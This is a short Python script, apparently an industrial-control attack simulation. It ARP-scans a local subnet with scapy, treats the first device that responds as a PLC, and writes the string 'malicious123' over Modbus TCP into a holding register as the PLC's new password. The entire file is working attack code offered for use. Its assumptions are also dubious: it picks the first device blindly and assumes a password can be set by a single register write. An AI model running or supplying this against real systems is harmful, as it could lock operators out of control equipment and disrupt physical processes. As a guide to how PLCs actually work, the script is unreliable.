from scapy.all import ARP, Ether, srp
from pymodbus.client import ModbusTcpClient
import struct

# Find PLC's IP via ARP scan
def find_plc_ip(network_range="192.168.1.0/24"):
    print("[*] Scanning network to find PLC...")
    
    # Create an ARP request
    arp_request = ARP(pdst=network_range)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    
    # Send request and capture responses
    answered, _ = srp(arp_request_broadcast, timeout=2, verbose=False)

    # Check if PLC is responding (filter by known MAC patterns if possible)
    for sent, received in answered:
        print(f"[-] Found possible device: {received.psrc} - {received.hwsrc}")
        # Assume PLC resides at a known default vendor MAC prefix, or let user identify it.
        # Here, we auto-pick the first found device (this might need adjustment!)
        return received.psrc

    print("[!] No PLC found. Exiting.")
    return None

# Modify PLC password (assuming this can be done via Modbus)
def change_plc_password(plc_ip, register_address=40001, new_password="malicious123"):
    print(f"[*] Connecting to PLC at {plc_ip}...")

    client = ModbusTcpClient(plc_ip)

    if client.connect():
        print("[+] Connected to PLC.")
        
        # Convert password string to modbus-compatible format (as UINT16 values)
        encoded_password = [ord(c) for c in new_password] 
        
        # Write the new password to PLC register
        response = client.write_registers(register_address, encoded_password)

        if response.isError():
            print("[!] Failed to change password!")
        else:
            print(f"[+] PLC password changed to '{new_password}'")

        client.close()
    else:
        print("[!] Unable to connect to PLC.")

# Main attack simulation
if __name__ == "__main__":
    plc_ip = find_plc_ip()

    if plc_ip:
        change_plc_password(plc_ip)